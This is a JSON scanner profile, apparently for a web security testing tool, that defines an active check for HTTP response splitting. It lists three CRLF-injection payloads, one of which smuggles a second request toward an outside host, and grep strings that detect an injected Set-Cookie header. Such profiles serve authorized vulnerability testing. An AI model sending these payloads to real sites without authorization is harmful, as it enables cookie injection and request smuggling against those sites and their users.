[{"Name":"ACTIVE - HTTP Response Splitting","Enabled":true,"Scanner":1,"Payloads":["INJECTX%0d%0aSet-Cookie:INJECTX123;%0d%0a","INJECTX%0aSet-Cookie:INJECTX123;%0a","INJECTX\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:\\u{0120}crowdshield.com\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/.injectx/r.php?http_split"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":["Set-Cookie: INJECTX123","Set-Cookie:INJECTX123"],"PayloadResponse":false,"NotResponse":false,"isTime":false,"iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":true,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"isurlextension":false,"NegativeUrlExtension":false,"MatchType":1,"RedirType":1,"MaxRedir":0,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"HTTP Response Splitting","IssueSeverity":"Medium","IssueConfidence":"Tentative","IssueDetail":"HTTP Response Splitting","RemediationDetail":"HTTP Response Splitting","IssueBackground":"HTTP Response Splitting","RemediationBackground":"HTTP Response Splitting","Scantype":0,"pathDiscovery":false}]